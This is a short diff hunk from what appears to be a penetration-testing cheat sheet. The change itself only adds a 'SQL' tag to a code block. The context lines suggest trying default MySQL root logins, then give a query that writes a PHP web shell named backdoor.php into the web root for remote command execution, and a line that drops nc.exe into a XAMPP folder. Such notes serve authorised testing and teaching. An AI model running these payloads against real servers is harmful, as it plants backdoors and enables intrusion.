@@ -1584,7 +1584,7 @@ Drupalgeddon
 
 - Try `root` without password or `root:password`
 - If you can login, try this query for a RCE
-  ```
+  ```SQL
   SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"
   SELECT LOAD_FILE('C:\\xampp\\htdocs\\nc.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
   ```
